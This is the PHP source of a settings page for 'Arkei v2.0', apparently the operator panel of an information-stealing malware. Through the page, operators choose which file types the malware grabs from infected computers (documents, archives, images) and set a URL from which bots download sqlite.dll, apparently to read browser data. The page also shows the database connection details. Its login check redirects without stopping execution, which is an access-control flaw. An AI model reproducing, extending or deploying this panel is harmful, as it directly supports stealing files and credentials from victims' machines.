<?php
/*
	Settings Page
*/

session_start();
error_reporting(0);

require("app/config.php");

if($config["db_server"] == null)
{
	header('Location: http://'. $_SERVER["HTTP_HOST"] .'/install');
	exit(0);
}

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["server_addr"] .'/auth', true, 301 );
}

$sqlite_lib_url = checkParam($_POST["sqlite_lib_url"]);
$grub_files = checkParam($_POST["grub_files"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	if($sqlite_lib_url != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$sqlite_lib_url' WHERE `Name`='sqlite_lib_url';");
	}
	
	if($grub_files != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$grub_files' WHERE `Name`='grub_files';");
	}
	
	$_sqlite_lib_url = $database->query("SELECT * FROM `settings` WHERE `Name`='sqlite_lib_url';")->fetch_array();
	$_grub_files = $database->query("SELECT * FROM `settings` WHERE `Name`='grub_files';")->fetch_array();
}
	
function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<!doctype html>
<html lang="en-us">
<head>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Settings | Arkei</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,600" rel="stylesheet">
	
	<link rel="apple-touch-icon" href="apple-touch-icon.png">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	
	<link rel="stylesheet" href="css/main.min.css">
</head>
<body>
	<div class="c-toolbar u-mb-medium">
		<h3 class="c-toolbar__title has-divider">Settings</h3>
		<h5 class="c-toolbar__meta u-mr-auto">Arkei v2.0 | Develop by <a href="https://t.me/foxovsky">@foxovsky</a></h5>
		
		<a href="/index"><button type="button" class="c-btn c-btn--info u-ml-small" >Logs</button></a>	
		<a href="/profiles"><button type="button" class="c-btn c-btn--info u-ml-small" >Profiles</button></a>	
		<a href="/settings"><button type="button" class="c-btn c-btn--success u-ml-small" >Settings</button></a>	
	</div>
	
	<div class="container">
	<div class="row">
                <div class="col-xl-3 u-hidden-down@wide">
                    <aside class="c-menu u-ml-medium">
                       
                    </aside>
                </div>

                <div class="col-md-7 col-xl-6">
                    <main>
					<form id="settings" action="/settings" method="POST">
					
                        <h2 class="u-h3 u-mb-small">Settings</h2>

                        <div class="c-card u-p-medium u-text-small u-mb-small">
						
                            <h6 class="u-text-bold">MySQL Info</h6>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">MySQL Status</dt>
								<?
								
								if($database)
								{
									?><dd style="color:green">Connected</dd><?
								}
								else
								{
									?><dd style="color:red">Can't connect to DB.</dd><?
								}
								
								?>
                            </dl>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">Server</dt>
                                <dd><? echo $config["db_server"]; ?></dd>
                            </dl>
							
							<dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">User</dt>
                                <dd><? echo $config["db_user"]; ?></dd>
                            </dl>
							
							<dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">Database</dt>
                                <dd><? echo $config["db_name"]; ?></dd>
                            </dl>
							
							<br>
							<i>Edit app/config.php to change this params.</i>
							
                        </div>
						
						<div class="c-card u-p-medium u-text-small u-mb-small">
						
                            <h6 class="u-text-bold">Gruber Settings</h6>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">File formats</dt>
                                <dd>
									<div class="c-field">
										<input class="c-input" id="grub_files" name="grub_files" style="width: 380px; margin-top:-9px;" type="text" placeholder="txt;doc;docx;log;rar;zip;7z;jpeg;jpg;png;bmp;" value="<? if($database) { echo $_grub_files["Value"]; } ?>">
									</div>
								</dd>
                            </dl>
							
                        </div>
						
						<div class="c-card u-p-medium u-text-small u-mb-small">
						
                            <h6 class="u-text-bold">Other Settings</h6>

                            <dl class="u-flex u-pv-small u-border-bottom">
                                <dt class="u-width-25">Sqlite Lib Url</dt>
                                <dd>
									<div class="c-field">
										<input class="c-input" id="sqlite_lib_url" name="sqlite_lib_url" style="width: 380px; margin-top:-9px;" type="text" placeholder="http://github.com/user/example/raw/master/sqlite.dll" value="<? 
										if($database)
										{
											echo $_sqlite_lib_url["Value"];
										} ?>">
									</div>
								</dd>
                            </dl>
							
                        </div>
						
						<div class="col u-mb-medium" style="width:200px; margin-right: 50%;">
							<a onclick="document.getElementById('settings').submit(); return false;" class="c-btn c-btn--success c-btn--fullwidth">Save</a>
						</div>
						
					</form>
                    </main>
                </div>
				
            </div>
        </div>
    </body>
</html>
<? mysql_close($database); ?>